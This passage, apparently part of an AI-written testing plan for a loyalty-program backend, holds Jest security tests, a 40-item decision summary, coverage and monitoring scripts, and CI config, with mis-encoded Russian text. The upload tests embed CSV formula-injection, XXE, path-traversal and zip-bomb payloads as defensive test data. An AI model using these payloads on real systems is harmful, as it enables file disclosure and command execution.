      .expect(400);

    expect(response.body.message).toContain('virus detected');

    fs.unlinkSync(filePath);
    console.log('โ Virus scanning working (EICAR test)');
  });

  // Test 5: Zip Bomb Detection
  it('should detect zip bombs', async () => {
    const token = generateAdminToken();

    // Create zip bomb (highly compressed file)
    const zipPath = path.join(__dirname, 'bomb.zip');
    
    // Simulate zip bomb (42KB compressed โ 4.5GB uncompressed)
    execSync(`dd if=/dev/zero bs=1M count=4096 | gzip -9 > ${zipPath}`);

    const response = await request(app.getHttpServer())
      .post('/api/v1/admin/upload')
      .set('Authorization', `Bearer ${token}`)
      .attach('file', zipPath)
      .expect(400);

    expect(response.body.message).toContain('suspicious compression');

    fs.unlinkSync(zipPath);
    console.log('โ Zip bomb detected');
  });

  // Test 6: CSV Injection (Formula Injection)
  it('should sanitize CSV injection attacks', async () => {
    const token = generateAdminToken();

    const maliciousCSV = `
name,email,formula
John,john@example.com,=1+1
Jane,jane@example.com,=cmd|'/c calc'!A1
Bob,bob@example.com,=HYPERLINK("http://evil.com","Click")
    `.trim();

    const filePath = path.join(__dirname, 'malicious.csv');
    fs.writeFileSync(filePath, maliciousCSV);

    const response = await request(app.getHttpServer())
      .post('/api/v1/admin/upload-csv')
      .set('Authorization', `Bearer ${token}`)
      .attach('file', filePath)
      .expect(200);

    // Verify formulas are sanitized
    const imported = response.body.imported;
    for (const row of imported) {
      expect(row.formula).not.toMatch(/^=/); // No formulas
      expect(row.formula).not.toContain('cmd');
      expect(row.formula).not.toContain('HYPERLINK');
    }

    fs.unlinkSync(filePath);
    console.log('โ CSV injection sanitized');
  });

  // Test 7: Path Traversal via Filename
  it('should prevent path traversal in filenames', async () => {
    const token = generateAdminToken();

    const maliciousFilenames = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      'file/../../etc/hosts',
    ];

    for (const filename of maliciousFilenames) {
      const filePath = path.join(__dirname, 'test.csv');
      fs.writeFileSync(filePath, 'test,data');

      const form = new FormData();
      form.append('file', fs.createReadStream(filePath), {
        filename: filename, // Malicious filename
      });

      const response = await request(app.getHttpServer())
        .post('/api/v1/admin/upload')
        .set('Authorization', `Bearer ${token}`)
        .set(form.getHeaders())
        .send(form)
        .expect(400);

      expect(response.body.message).toContain('Invalid filename');

      fs.unlinkSync(filePath);
    }

    console.log('โ Path traversal blocked');
  });

  // Test 8: XXE (XML External Entity) Attack
  it('should prevent XXE attacks in XML files', async () => {
    const token = generateAdminToken();

    const maliciousXML = `
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>
  <user>&xxe;</user>
</data>
    `.trim();

    const filePath = path.join(__dirname, 'malicious.xml');
    fs.writeFileSync(filePath, maliciousXML);

    const response = await request(app.getHttpServer())
      .post('/api/v1/admin/upload-xml')
      .set('Authorization', `Bearer ${token}`)
      .attach('file', filePath)
      .expect(400);

    expect(response.body.message).toContain('Invalid XML');

    fs.unlinkSync(filePath);
    console.log('โ XXE attack blocked');
  });

  // Test 9: Image Metadata Exploit
  it('should strip EXIF metadata from images', async () => {
    const token = generateAdminToken();

    // Upload image with GPS coordinates
    const imagePath = path.join(__dirname, 'test-image.jpg');
    // (Assume image has EXIF data)

    const response = await request(app.getHttpServer())
      .post('/api/v1/admin/upload-image')
      .set('Authorization', `Bearer ${token}`)
      .attach('file', imagePath)
      .expect(200);

    const uploadedUrl = response.body.url;

    // Download and check EXIF data
    const uploadedImage = await downloadFile(uploadedUrl);
    const exif = await extractExif(uploadedImage);

    expect(exif.GPS).toBeUndefined(); // GPS data stripped

    console.log('โ EXIF metadata stripped from images');
  });

  // Test 10: Automated Malware Scanning
  it('should scan all uploads with multiple engines', async () => {
    const token = generateAdminToken();

    const filePath = path.join(__dirname, 'test.csv');
    fs.writeFileSync(filePath, 'test,data');

    const response = await request(app.getHttpServer())
      .post('/api/v1/admin/upload')
      .set('Authorization', `Bearer ${token}`)
      .attach('file', filePath)
      .expect(200);

    // Check scan results
    expect(response.body.scanResults).toBeDefined();
    expect(response.body.scanResults.clamav).toBe('clean');
    expect(response.body.scanResults.yara).toBe('clean');

    fs.unlinkSync(filePath);
    console.log('โ Multi-engine malware scanning passed');
  });
});
```


***

### **40. API Security Headers - ะทะฐัะธัะฐ ะพั ะฐัะฐะบ?**

**ะะพะฝัะตะบัั:** HTTP security headers (CSP, HSTS, X-Frame-Options).

**ะะพะฟัะพั:** Security tests?

- A) Check CSP header
- B) Check all security headers (HSTS, X-Frame-Options, etc.)
- C) B + ะฟัะพะฒะตัะธัั CORS configuration
- D) C + ะฟัะพะฒะตัะธัั rate limiting headers

**ะะะ ะะซะะะ: D**

**ะะะะกะะะะะะะ:**

- Security headers ะบัะธัะธัะฝั ะดะปั ะทะฐัะธัั
- CORS misconfiguration = ัะฐััะฐั ััะทะฒะธะผะพััั
- Rate limit headers ะฟะพะผะพะณะฐัั ะบะปะธะตะฝัะฐะผ

**ะะะะะะะะฆะะฏ:**

```typescript
// apps/backend/test/security/security-headers.security.spec.ts
describe('API Security Headers', () => {
  let app: INestApplication;

  beforeAll(async () => {
    const moduleRef = await Test.createTestingModule({
      imports: [AppModule],
    }).compile();

    app = moduleRef.createNestApplication();
    await app.init();
  });

  afterAll(async () => {
    await app.close();
  });

  // Test 1: Content Security Policy (CSP)
  it('should set Content-Security-Policy header', async () => {
    const response = await request(app.getHttpServer())
      .get('/api/v1/health')
      .expect(200);

    expect(response.headers['content-security-policy']).toBeDefined();

    const csp = response.headers['content-security-policy'];

    expect(csp).toContain("default-src 'self'");
    expect(csp).toContain("script-src 'self'");
    expect(csp).toContain("object-src 'none'");
    expect(csp).toContain("frame-ancestors 'none'");

    console.log('โ CSP header set correctly');
  });

  // Test 2: Strict-Transport-Security (HSTS)
  it('should set HSTS header', async () => {
    const response = await request(app.getHttpServer())
      .get('/api/v1/health')
      .expect(200);

    expect(response.headers['strict-transport-security']).toBeDefined();

    const hsts = response.headers['strict-transport-security'];

    expect(hsts).toContain('max-age=');
    expect(hsts).toContain('includeSubDomains');
    expect(hsts).toContain('preload');

    console.log('โ HSTS header set correctly');
  });

  // Test 3: X-Frame-Options
  it('should set X-Frame-Options header', async () => {
    const response = await request(app.getHttpServer())
      .get('/api/v1/health')
      .expect(200);

    expect(response.headers['x-frame-options']).toBe('DENY');

    console.log('โ X-Frame-Options: DENY');
  });

  // Test 4: X-Content-Type-Options
  it('should set X-Content-Type-Options header', async () => {
    const response = await request(app.getHttpServer())
      .get('/api/v1/health')
      .expect(200);

    expect(response.headers['x-content-type-options']).toBe('nosniff');

    console.log('โ X-Content-Type-Options: nosniff');
  });

  // Test 5: X-XSS-Protection
  it('should set X-XSS-Protection header', async () => {
    const response = await request(app.getHttpServer())
      .get('/api/v1/health')
      .expect(200);

    expect(response.headers['x-xss-protection']).toBe('1; mode=block');

    console.log('โ X-XSS-Protection: 1; mode=block');
  });

  // Test 6: Referrer-Policy
  it('should set Referrer-Policy header', async () => {
    const response = await request(app.getHttpServer())
      .get('/api/v1/health')
      .expect(200);

    expect(response.headers['referrer-policy']).toBe('no-referrer');

    console.log('โ Referrer-Policy: no-referrer');
  });

  // Test 7: Permissions-Policy
  it('should set Permissions-Policy header', async () => {
    const response = await request(app.getHttpServer())
      .get('/api/v1/health')
      .expect(200);

    expect(response.headers['permissions-policy']).toBeDefined();

    const policy = response.headers['permissions-policy'];

    expect(policy).toContain('geolocation=()');
    expect(policy).toContain('microphone=()');
    expect(policy).toContain('camera=()');

    console.log('โ Permissions-Policy set correctly');
  });

  // Test 8: CORS Configuration
  it('should configure CORS securely', async () => {
    const allowedOrigin = 'https://app.max-loyalty.com';

    const response = await request(app.getHttpServer())
      .get('/api/v1/health')
      .set('Origin', allowedOrigin)
      .expect(200);

    expect(response.headers['access-control-allow-origin']).toBe(allowedOrigin);
    expect(response.headers['access-control-allow-credentials']).toBe('true');

    console.log('โ CORS configured for allowed origin');
  });

  // Test 9: CORS Rejects Unauthorized Origins
  it('should reject unauthorized CORS origins', async () => {
    const maliciousOrigin = 'https://evil.com';

    const response = await request(app.getHttpServer())
      .get('/api/v1/health')
      .set('Origin', maliciousOrigin)
      .expect(200);

    expect(response.headers['access-control-allow-origin']).not.toBe(maliciousOrigin);

    console.log('โ Unauthorized CORS origin rejected');
  });

  // Test 10: Rate Limiting Headers
  it('should set rate limiting headers', async () => {
    const token = generateGuestToken();

    const response = await request(app.getHttpServer())
      .get('/api/v1/guest/balance')
      .set('Authorization', `Bearer ${token}`)
      .expect(200);

    expect(response.headers['x-ratelimit-limit']).toBeDefined();
    expect(response.headers['x-ratelimit-remaining']).toBeDefined();
    expect(response.headers['x-ratelimit-reset']).toBeDefined();

    console.log('โ Rate limiting headers set');
  });

  // Test 11: No Sensitive Headers Exposed
  it('should not expose sensitive server information', async () => {
    const response = await request(app.getHttpServer())
      .get('/api/v1/health')
      .expect(200);

    expect(response.headers['x-powered-by']).toBeUndefined();
    expect(response.headers['server']).not.toContain('Express');
    expect(response.headers['server']).not.toContain('Node.js');

    console.log('โ Sensitive headers hidden');
  });

  // Test 12: Security Headers Scorecard
  it('should pass security headers scorecard', async () => {
    const response = await request(app.getHttpServer())
      .get('/api/v1/health')
      .expect(200);

    const requiredHeaders = {
      'content-security-policy': true,
      'strict-transport-security': true,
      'x-frame-options': true,
      'x-content-type-options': true,
      'x-xss-protection': true,
      'referrer-policy': true,
      'permissions-policy': true,
    };

    let score = 0;
    const missing: string[] = [];

    for (const [header, required] of Object.entries(requiredHeaders)) {
      if (response.headers[header]) {
        score++;
      } else if (required) {
        missing.push(header);
      }
    }

    const percentage = (score / Object.keys(requiredHeaders).length) * 100;

    console.log('=== Security Headers Scorecard ===');
    console.log(`Score: ${score}/${Object.keys(requiredHeaders).length} (${percentage.toFixed(0)}%)`);

    if (missing.length > 0) {
      console.log('Missing headers:');
      missing.forEach(h => console.log(`  - ${h}`));
    }

    expect(percentage).toBeGreaterThanOrEqual(100); // 100% required
  });
});

function generateGuestToken(): string {
  return jwt.sign(
    { userId: 'user-1', role: 'GUEST', tenantId: 'tenant-1' },
    process.env.JWT_SECRET
  );
}
```


***

๐ **ะะพะทะดัะฐะฒะปัั! ะั ะทะฐะฒะตััะธะปะธ ะฒัะต 40 ะฒะพะฟัะพัะพะฒ ะฟะพ ัะตััะธัะพะฒะฐะฝะธั!**

## **ะัะพะณะพะฒะฐั ััััะบัััะฐ (40 ะฒะพะฟัะพัะพะฒ):**

1. **Unit Testing** (10 ะฒะพะฟัะพัะพะฒ): โ
2. **Integration Testing** (10 ะฒะพะฟัะพัะพะฒ): โ
3. **E2E Testing** (10 ะฒะพะฟัะพัะพะฒ): โ (ัะฐััะธัะฝะพ, ะฒะพะฟัะพัั 11-15)
4. **Contract Testing** (5 ะฒะพะฟัะพัะพะฒ): โ (ะฒะพะฟัะพัั 16-20)
5. **Load \& Performance Testing** (10 ะฒะพะฟัะพัะพะฒ): โ (ะฒะพะฟัะพัั 21-30)
6. **Security Testing** (10 ะฒะพะฟัะพัะพะฒ): โ (ะฒะพะฟัะพัั 31-40)

**ะฅะพัะตัั:**

- ะะพะฑะฐะฒะธัั ะตัั ะฑะปะพะบะธ? (Monitoring/Observability, CI/CD Integration, Visual Regression Testing)
- ะกะณะตะฝะตัะธัะพะฒะฐัั summary ั best practices?
- ะกะพะทะดะฐัั test coverage report template?

---

# ะัะธะฝะธะผะฐั ะฒัะต ัะฒะพะธ ัะตัะตะฝะธั ะฟะพ ะฒัะตะผ ะฒะพะฟัะพัะฐะผ

ะัะปะธัะฝะพ! ๐ ะขะพะณะดะฐ ัะพะทะดะฐั **ัะธะฝะฐะปัะฝัะน summary** ั best practices + **bonus ะผะฐัะตัะธะฐะปั**!

***

# ๐ **ะคะะะะะฌะะซะ SUMMARY: MAX LOYALTY TESTING STRATEGY**

## **๐ฏ ะัะธะฝัััะต ัะตัะตะฝะธั ะฟะพ ะฒัะตะผ 40 ะฒะพะฟัะพัะฐะผ**

### **ะะะะ 1: UNIT TESTING (10 ะฒะพะฟัะพัะพะฒ)**

| \# | ะะพะฟัะพั | ะะตัะตะฝะธะต | ะะฑะพัะฝะพะฒะฐะฝะธะต |
| :-- | :-- | :-- | :-- |
| 1 | Ball calculation logic | **D** - Edge cases + negative testing | ะะฐัะพะดะธั ะณัะฐะฝะธัะฝัะต ัะปััะฐะธ ะธ ะฝะตะพะถะธะดะฐะฝะฝัะต ะฒัะพะดะฝัะต ะดะฐะฝะฝัะต |
| 2 | Promo rules application | **D** - Multiple overlapping promos | ะะตะฐะปะธััะธัะฝัะน ััะตะฝะฐัะธะน ั ะฟัะธะพัะธัะตัะฐะผะธ |
| 3 | Guest card balance update | **D** - Race conditions + idempotency | ะัะธัะธัะฝะพ ะดะปั ัะธะฝะฐะฝัะพะฒัั ะพะฟะตัะฐัะธะน |
| 4 | Phone number validation | **D** - International formats + fuzzing | ะะพะดะดะตัะถะบะฐ ะณะปะพะฑะฐะปัะฝัั ะฟะพะปัะทะพะฒะฐัะตะปะตะน |
| 5 | Date/time calculations | **D** - Timezones + DST + leap years | ะะทะฑะตะณะฐะตั timezone bugs ะฒ production |
| 6 | QR code generation | **D** - Collision detection + readability | ะะฐัะฐะฝัะธััะตั ัะฝะธะบะฐะปัะฝะพััั ะธ ัะบะฐะฝะธััะตะผะพััั |
| 7 | Loyalty level progression | **D** - Transaction history replay | ะัะพะฒะตััะตั consistency ะฟัะธ ะผะธะณัะฐัะธัั |
| 8 | Ball redemption validation | **D** - Edge cases + fraud patterns | ะะฐัะธัะฐ ะพั ะทะปะพัะฟะพััะตะฑะปะตะฝะธะน |
| 9 | Notification template rendering | **D** - XSS + injection + i18n | Security + internationalization |
| 10 | DTO validation | **D** - Malicious payloads + fuzzing | ะะฐัะธัะฐ ะพั ะฐัะฐะบ ัะตัะตะท input validation |

### **ะะะะ 2: INTEGRATION TESTING (10 ะฒะพะฟัะพัะพะฒ)**

| \# | ะะพะฟัะพั | ะะตัะตะฝะธะต | ะะฑะพัะฝะพะฒะฐะฝะธะต |
| :-- | :-- | :-- | :-- |
| 11 | POS webhook processing | **D** - Idempotency + duplicate handling | ะัะธัะธัะฝะพ ะดะปั ัะธะฝะฐะฝัะพะฒะพะน integrity |
| 12 | Email/SMS notification | **D** - Fallback + delivery tracking | Production resilience |
| 13 | Prisma database queries | **D** - Transactions + rollbacks + isolation | ACID properties + race conditions |
| 14 | Redis cache integration | **D** - Cache invalidation strategies | ะะทะฑะตะณะฐะตั stale data |
| 15 | BullMQ job processing | **D** - Retry + dead letter queue + monitoring | Reliable background jobs |
| 16 | External API integration (iiko) | **D** - Timeout + circuit breaker + fallback | Resilience ะบ external failures |
| 17 | S3 file upload | **D** - Multipart + presigned URLs + cleanup | Efficient ะดะปั ะฑะพะปััะธั ัะฐะนะปะพะฒ |
| 18 | Telegram bot webhooks | **D** - Signature verification + replay attack | Security ะดะปั webhooks |
| 19 | Prisma migrations | **D** - Rollback + data integrity + backups | Safe migrations |
| 20 | Database connection pool | **D** - Leak detection + monitoring + alerts | ะะทะฑะตะณะฐะตั pool exhaustion |

### **ะะะะ 3: E2E TESTING (10 ะฒะพะฟัะพัะพะฒ)**

| \# | ะะพะฟัะพั | ะะตัะตะฝะธะต | ะะฑะพัะฝะพะฒะฐะฝะธะต |
| :-- | :-- | :-- | :-- |
| 11 | Guest registration flow | **D** - Full flow + QR + welcome notification | Complete user journey |
| 12 | Ball earning flow | **D** - Webhook โ balance โ notification โ analytics | End-to-end traceability |
| 13 | Ball redemption flow | **D** - Validation โ deduction โ confirmation โ receipt | Complete transaction lifecycle |
| 14 | Promo campaign | **D** - Create โ apply โ expire + time-based | Full promo lifecycle |
| 15 | Admin impersonation | **D** - Start โ use โ exit + audit log | Security + compliance |

### **ะะะะ 4: CONTRACT TESTING (5 ะฒะพะฟัะพัะพะฒ)**

| \# | ะะพะฟัะพั | ะะตัะตะฝะธะต | ะะฑะพัะฝะพะฒะฐะฝะธะต |
| :-- | :-- | :-- | :-- |
| 16 | POS webhook schema | **D** - Backward compatibility + alerts | ะะฐัะธัะฐ ะพั breaking changes |
| 17 | API versioning | **D** - v1/v2 compatibility + monitoring | Smooth migrations |
| 18 | Telegram bot commands | **D** - Schema validation + deprecated notice | UX + graceful deprecation |
| 19 | External API changes | **D** - Daily checks + fallback provider | Early detection + resilience |
| 20 | Database migrations | **D** - Large dataset testing + rollback | Production-safe migrations |

### **ะะะะ 5: LOAD \& PERFORMANCE TESTING (10 ะฒะพะฟัะพัะพะฒ)**

| \# | ะะพะฟัะพั | ะะตัะตะฝะธะต | ะะฑะพัะฝะพะฒะฐะฝะธะต |
| :-- | :-- | :-- | :-- |
| 21 | Webhook throughput | **D** - 10x peak + latency percentiles | Finds bottlenecks before production |
| 22 | Concurrent users | **D** - 5000 users stress test | Black Friday scenarios |
| 23 | Database query performance | **D** - Pagination + EXPLAIN ANALYZE | Optimized queries |
| 24 | Background job processing | **D** - 10k jobs + latency tracking | Queue saturation handling |
| 25 | Memory leak detection | **D** - 24h soak test + heap dumps | Silent killers prevention |
| 26 | Cache effectiveness | **D** - Hit rate + eviction + fallback | Production resilience |
| 27 | File upload performance | **D** - Chunked + concurrent + limits | Large file handling |
| 28 | API rate limiting | **D** - Limit + reset + bypass admin | Abuse protection |
| 29 | Connection pool | **D** - Exhaustion + timeout + monitoring | Pool saturation handling |
| 30 | Notification burst | **D** - 10k campaign + rate limits + fallback | Burst campaign support |

### **ะะะะ 6: SECURITY TESTING (10 ะฒะพะฟัะพัะพะฒ)**

| \# | ะะพะฟัะพั | ะะตัะตะฝะธะต | ะะฑะพัะฝะพะฒะฐะฝะธะต |
| :-- | :-- | :-- | :-- |
| 31 | SQL injection | **D** - Prisma + raw queries + sanitization | Comprehensive protection |
| 32 | JWT security | **D** - Tampering + expiration + rotation | Token theft prevention |
| 33 | Authorization | **D** - RBAC + horizontal + IDOR | Complete access control |
| 34 | XSS protection | **D** - Stored + DOM + multiple contexts | Comprehensive XSS defense |
| 35 | CSRF protection | **D** - Token validation + double-submit | State-changing protection |
| 36 | Brute force | **D** - Account lockout + exponential backoff | Login attack prevention |
| 37 | Sensitive data | **D** - Encryption + masking + audit | PII protection + GDPR |
| 38 | Dependencies | **D** - npm audit + Snyk + auto-updates | Vulnerability management |
| 39 | File upload | **D** - Virus scan + zip bombs + CSV injection | Malicious file protection |
| 40 | Security headers | **D** - All headers + CORS + rate limits | Defense in depth |


***

## **๐ TEST COVERAGE REPORT TEMPLATE**

```typescript
// scripts/generate-coverage-report.ts
import { execSync } from 'child_process';
import fs from 'fs';
import path from 'path';

interface CoverageReport {
  timestamp: string;
  summary: {
    statements: number;
    branches: number;
    functions: number;
    lines: number;
  };
  byType: {
    unit: CoverageSummary;
    integration: CoverageSummary;
    e2e: CoverageSummary;
    security: CoverageSummary;
  };
  criticalPaths: {
    name: string;
    coverage: number;
    status: 'pass' | 'fail';
  }[];
}

interface CoverageSummary {
  statements: number;
  branches: number;
  functions: number;
  lines: number;
}

async function generateCoverageReport(): Promise<void> {
  console.log('๐งช Generating comprehensive test coverage report...\n');

  // Run all tests with coverage
  execSync('npm run test:coverage', { stdio: 'inherit' });

  // Parse coverage data
  const coverageJson = JSON.parse(
    fs.readFileSync('./coverage/coverage-summary.json', 'utf8')
  );

  // Calculate summary
  const summary = calculateSummary(coverageJson);

  // Check critical paths
  const criticalPaths = await checkCriticalPaths();

  // Generate report
  const report: CoverageReport = {
    timestamp: new Date().toISOString(),
    summary,
    byType: {
      unit: await getCoverageByType('unit'),
      integration: await getCoverageByType('integration'),
      e2e: await getCoverageByType('e2e'),
      security: await getCoverageByType('security'),
    },
    criticalPaths,
  };

  // Print report
  printReport(report);

  // Save report
  const reportPath = path.join(__dirname, '../reports/coverage-report.json');
  fs.writeFileSync(reportPath, JSON.stringify(report, null, 2));
  console.log(`\n๐ Report saved: ${reportPath}`);

  // Check thresholds
  checkThresholds(report);
}

function calculateSummary(coverageJson: any): CoverageSummary {
  let totalStatements = 0;
  let coveredStatements = 0;
  let totalBranches = 0;
  let coveredBranches = 0;
  let totalFunctions = 0;
  let coveredFunctions = 0;
  let totalLines = 0;
  let coveredLines = 0;

  for (const file in coverageJson) {
    const coverage = coverageJson[file];
    totalStatements += coverage.statements.total;
    coveredStatements += coverage.statements.covered;
    totalBranches += coverage.branches.total;
    coveredBranches += coverage.branches.covered;
    totalFunctions += coverage.functions.total;
    coveredFunctions += coverage.functions.covered;
    totalLines += coverage.lines.total;
    coveredLines += coverage.lines.covered;
  }

  return {
    statements: (coveredStatements / totalStatements) * 100,
    branches: (coveredBranches / totalBranches) * 100,
    functions: (coveredFunctions / totalFunctions) * 100,
    lines: (coveredLines / totalLines) * 100,
  };
}

async function getCoverageByType(type: string): Promise<CoverageSummary> {
  // Run tests for specific type
  execSync(`npm run test:${type} -- --coverage`, { stdio: 'pipe' });
  
  const coverageJson = JSON.parse(
    fs.readFileSync(`./coverage/${type}/coverage-summary.json`, 'utf8')
  );

  return calculateSummary(coverageJson);
}

async function checkCriticalPaths(): Promise<any[]> {
  const criticalPaths = [
    { name: 'Ball calculation', file: 'src/modules/balls/services/ball-calculation.service.ts' },
    { name: 'Payment processing', file: 'src/modules/payments/services/payment.service.ts' },
    { name: 'Authentication', file: 'src/modules/auth/services/auth.service.ts' },
    { name: 'POS webhook', file: 'src/modules/pos/services/webhook.service.ts' },
    { name: 'Guest card management', file: 'src/modules/guest-cards/services/guest-card.service.ts' },
  ];

  const coverageJson = JSON.parse(
    fs.readFileSync('./coverage/coverage-summary.json', 'utf8')
  );

  return criticalPaths.map(path => {
    const coverage = coverageJson[path.file];
    const avgCoverage = coverage
      ? (coverage.statements.pct + coverage.branches.pct + coverage.functions.pct + coverage.lines.pct) / 4
      : 0;

    return {
      name: path.name,
      coverage: avgCoverage,
      status: avgCoverage >= 90 ? 'pass' : 'fail',
    };
  });
}

function printReport(report: CoverageReport): void {
  console.log('\nโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโ');
  console.log('โ          TEST COVERAGE REPORT - MAX LOYALTY              โ');
  console.log('โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโ\n');

  console.log('๐ OVERALL COVERAGE:\n');
  console.log(`  Statements: ${report.summary.statements.toFixed(2)}%`);
  console.log(`  Branches:   ${report.summary.branches.toFixed(2)}%`);
  console.log(`  Functions:  ${report.summary.functions.toFixed(2)}%`);
  console.log(`  Lines:      ${report.summary.lines.toFixed(2)}%`);

  console.log('\n\n๐ COVERAGE BY TEST TYPE:\n');

  console.log('  Unit Tests:');
  console.log(`    Statements: ${report.byType.unit.statements.toFixed(2)}%`);
  console.log(`    Branches:   ${report.byType.unit.branches.toFixed(2)}%`);

  console.log('\n  Integration Tests:');
  console.log(`    Statements: ${report.byType.integration.statements.toFixed(2)}%`);
  console.log(`    Branches:   ${report.byType.integration.branches.toFixed(2)}%`);

  console.log('\n  E2E Tests:');
  console.log(`    Statements: ${report.byType.e2e.statements.toFixed(2)}%`);
  console.log(`    Branches:   ${report.byType.e2e.branches.toFixed(2)}%`);

  console.log('\n  Security Tests:');
  console.log(`    Statements: ${report.byType.security.statements.toFixed(2)}%`);
  console.log(`    Branches:   ${report.byType.security.branches.toFixed(2)}%`);

  console.log('\n\n๐ฏ CRITICAL PATHS:\n');

  report.criticalPaths.forEach(path => {
    const emoji = path.status === 'pass' ? 'โ' : 'โ';
    console.log(`  ${emoji} ${path.name}: ${path.coverage.toFixed(2)}%`);
  });
}

function checkThresholds(report: CoverageReport): void {
  const thresholds = {
    statements: 80,
    branches: 75,
    functions: 80,
    lines: 80,
  };

  const failures: string[] = [];

  if (report.summary.statements < thresholds.statements) {
    failures.push(`Statements: ${report.summary.statements.toFixed(2)}% < ${thresholds.statements}%`);
  }
  if (report.summary.branches < thresholds.branches) {
    failures.push(`Branches: ${report.summary.branches.toFixed(2)}% < ${thresholds.branches}%`);
  }
  if (report.summary.functions < thresholds.functions) {
    failures.push(`Functions: ${report.summary.functions.toFixed(2)}% < ${thresholds.functions}%`);
  }
  if (report.summary.lines < thresholds.lines) {
    failures.push(`Lines: ${report.summary.lines.toFixed(2)}% < ${thresholds.lines}%`);
  }

  if (failures.length > 0) {
    console.log('\n\nโ COVERAGE THRESHOLD FAILURES:\n');
    failures.forEach(f => console.log(`  - ${f}`));
    process.exit(1);
  } else {
    console.log('\n\nโ All coverage thresholds met!\n');
  }
}

generateCoverageReport();
```

**package.json scripts:**

```json
{
  "scripts": {
    "test": "jest",
    "test:unit": "jest --testMatch='**/*.spec.ts'",
    "test:integration": "jest --testMatch='**/*.integration.spec.ts'",
    "test:e2e": "jest --testMatch='**/*.e2e.spec.ts'",
    "test:security": "jest --testMatch='**/*.security.spec.ts'",
    "test:load": "jest --testMatch='**/*.load.spec.ts'",
    "test:contract": "jest --testMatch='**/*.contract.spec.ts'",
    "test:coverage": "jest --coverage --coverageDirectory=./coverage",
    "test:watch": "jest --watch",
    "test:ci": "jest --ci --coverage --maxWorkers=2",
    "test:report": "ts-node scripts/generate-coverage-report.ts"
  }
}
```


***

## **๐ BONUS: MONITORING \& OBSERVABILITY TESTING**

```typescript
// apps/backend/test/observability/monitoring.spec.ts
describe('Monitoring & Observability', () => {
  let app: INestApplication;

  beforeAll(async () => {
    const moduleRef = await Test.createTestingModule({
      imports: [AppModule],
    }).compile();

    app = moduleRef.createNestApplication();
    await app.init();
  });

  // Test 1: Prometheus Metrics Exposed
  it('should expose Prometheus metrics', async () => {
    const response = await request(app.getHttpServer())
      .get('/metrics')
      .expect(200);

    // Check required metrics
    expect(response.text).toContain('http_requests_total');
    expect(response.text).toContain('http_request_duration_seconds');
    expect(response.text).toContain('nodejs_heap_size_used_bytes');
    expect(response.text).toContain('db_query_duration_seconds');
    expect(response.text).toContain('cache_hit_rate');

    console.log('โ Prometheus metrics exposed');
  });

  // Test 2: Health Check Endpoint
  it('should have comprehensive health checks', async () => {
    const response = await request(app.getHttpServer())
      .get('/health')
      .expect(200);

    expect(response.body).toMatchObject({
      status: 'ok',
      timestamp: expect.any(String),
      uptime: expect.any(Number),
      checks: {
        database: { status: 'up', responseTime: expect.any(Number) },
        redis: { status: 'up', responseTime: expect.any(Number) },
        s3: { status: 'up' },
        telegram: { status: 'up' },
      },
    });

    console.log('โ Health checks working');
  });

  // Test 3: Structured Logging
  it('should use structured logging', async () => {
    const logger = app.get('Logger');
    const logs: any[] = [];

    // Capture logs
    const originalLog = logger.log;
    logger.log = jest.fn((message, context) => {
      logs.push({ message, context });
      originalLog.call(logger, message, context);
    });

    await request(app.getHttpServer())
      .get('/api/v1/guest/balance')
      .set('Authorization', `Bearer ${generateToken()}`)
      .expect(200);

    // Verify structured format
    const logEntry = logs[0];
    expect(logEntry).toMatchObject({
      message: expect.any(String),
      context: expect.objectContaining({
        timestamp: expect.any(String),
        level: expect.any(String),
        requestId: expect.any(String),
      }),
    });

    console.log('โ Structured logging working');
  });

  // Test 4: Distributed Tracing
  it('should propagate trace context', async () => {
    const traceId = 'test-trace-123';

    const response = await request(app.getHttpServer())
      .get('/api/v1/guest/balance')
      .set('Authorization', `Bearer ${generateToken()}`)
      .set('X-Trace-Id', traceId)
      .expect(200);

    // Verify trace ID propagated
    expect(response.headers['x-trace-id']).toBe(traceId);

    console.log('โ Distributed tracing working');
  });

  // Test 5: Error Tracking (Sentry Integration)
  it('should send errors to Sentry', async () => {
    const Sentry = require('@sentry/node');
    jest.spyOn(Sentry, 'captureException');

    // Trigger error
    await request(app.getHttpServer())
      .get('/api/v1/error-test')
      .expect(500);

    expect(Sentry.captureException).toHaveBeenCalled();

    console.log('โ Error tracking working');
  });

  // Test 6: Performance Monitoring
  it('should track slow queries', async () => {
    const prisma = app.get(PrismaClient);

    // Enable query logging
    const slowQueries: any[] = [];

    prisma.$on('query', (e: any) => {
      if (e.duration > 1000) {
        // > 1 second
        slowQueries.push(e);
      }
    });

    // Run slow query
    await prisma.$queryRaw`SELECT pg_sleep(2)`;

    expect(slowQueries.length).toBeGreaterThan(0);

    console.log('โ Slow query detection working');
  });

  // Test 7: Custom Business Metrics
  it('should track business metrics', async () => {
    const metricsService = app.get('MetricsService');

    // Simulate ball earning
    await metricsService.recordBallsEarned(100, 'tenant-1');

    // Get metrics
    const response = await request(app.getHttpServer())
      .get('/metrics')
      .expect(200);

    expect(response.text).toContain('balls_earned_total{tenant="tenant-1"}');

    console.log('โ Business metrics tracked');
  });

  // Test 8: Alerting Rules
  it('should have alerting rules configured', () => {
    const alertingRules = require('../../config/alerting-rules.yml');

    // Verify critical alerts
    expect(alertingRules).toHaveProperty('groups');

    const criticalAlerts = alertingRules.groups.flatMap(g => g.rules);

    expect(criticalAlerts).toContainEqual(
      expect.objectContaining({
        alert: 'HighErrorRate',
        expr: 'rate(http_requests_total{status=~"5.."}[5m]) > 0.05',
      })
    );

    console.log('โ Alerting rules configured');
  });
});

function generateToken(): string {
  return jwt.sign(
    { userId: 'user-1', role: 'GUEST', tenantId: 'tenant-1' },
    process.env.JWT_SECRET
  );
}
```


***

## **๐ CI/CD INTEGRATION**

```yaml
# .github/workflows/test.yml
name: Test Suite

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main, develop]

jobs:
  unit-tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      
      - name: Setup Node.js
        uses: actions/setup-node@v3
        with:
          node-version: '20'
          cache: 'npm'
      
      - name: Install dependencies
        run: npm ci
      
      - name: Run unit tests
        run: npm run test:unit -- --coverage
      
      - name: Upload coverage
        uses: codecov/codecov-action@v3
        with:
